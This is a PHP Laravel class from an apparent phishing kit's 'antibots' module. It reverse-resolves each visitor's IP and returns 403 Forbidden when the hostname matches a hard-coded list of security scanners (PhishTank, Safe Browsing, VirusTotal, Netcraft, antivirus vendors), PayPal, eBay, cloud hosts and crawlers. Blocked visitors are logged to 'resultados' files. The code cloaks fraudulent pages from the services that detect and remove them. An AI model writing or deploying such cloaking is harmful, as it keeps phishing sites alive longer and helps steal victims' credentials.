<?php

namespace App\Services\Antibots\Rules\Guard;

class BlockHn
{
    public function run()
    {
        $ip = request()->ip();
        $userAgent = request()->userAgent() ?? 'Unknown';

        if (!$ip) {
            return;
        }

        $hostname = gethostbyaddr($ip);

        // Si gethostbyaddr falla, devuelve la IP original o false
        // Solo proceder si tenemos un hostname válido y diferente de la IP
        if (!$hostname || $hostname === $ip) {
            return;
        }

        $blockedWords = [
            "above", "google", "softlayer", "amazonaws","cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute",
            "tor-exit", "msnbot", "p3pwgdsn", "netcraft", "trendmicro", "ebay", "paypal", "torservers",
            "messagelabs", "sucuri.net", "crawler", "duckduck", "feedfetcher", "BitDefender", "mcafee", "antivirus",
            "cloudflare", "avg", "avira", "avast", "ovh.net", "security", "twitter", "bitdefender", "virustotal",
            "phising", "clamav", "baidu", "safebrowsing", "eset", "mailshell", "azure", "miniature", "tlh.ro",
            "aruba", "dyn.plus.net", "pagepeeker", "SPRO-NET-207-70-0", "SPRO-NET-209-19-128", "vultr",
            "colocrossing.com", "geosr", "drweb", "dr.web", "linode.com", "opendns", "cymru.com", "sl-reverse.com",
            "surriel.com", "hosting", "orange-labs", "speedtravel", "metauri", "apple.com", "bruuk.sk", "sysms.net",
            "oracle", "cisco", "amuri.net", "versanet.de", "hilfe-veripayed.com"
        ];

        foreach ($blockedWords as $word) {
            if (stripos($hostname, $word) !== false) {
                $this->logDetection($ip, $userAgent, $hostname);
                abort(403, 'Forbidden');
            }
        }
    }

    public function logDetection(string $ip, string $userAgent, string $hostname = ''): void
    {
        // Asegurar que el directorio existe
        $logDir = storage_path('logs/resultados');
        if (!is_dir($logDir)) {
            mkdir($logDir, 0755, true);
        }

        $hostnameInfo = $hostname ? " || Hostname: $hostname" : '';

        // Guardar en archivo bloqueados.log
        $logContent = "BLOQUEADO POR HOSTNAME || user-agent: $userAgent\nIP: $ip$hostnameInfo || " . gmdate("Y-n-d") . " ----> " . gmdate("H:i:s") . "\n\n";

        if (file_put_contents(storage_path('logs/resultados/bloqueados.log'), $logContent, FILE_APPEND) === false) {
            // Log silencioso falló, pero no interrumpir el flujo
            error_log("Failed to write to bloqueados.log for IP: $ip");
        }

        // Registrar IP en resultado_total.log
        $totalLogContent = "$ip (Detectado por HOSTNAME)\n";

        if (file_put_contents(storage_path('logs/resultados/resultado_total.log'), $totalLogContent, FILE_APPEND) === false) {
            // Log silencioso falló, pero no interrumpir el flujo
            error_log("Failed to write to resultado_total.log for IP: $ip");
        }
    }
}
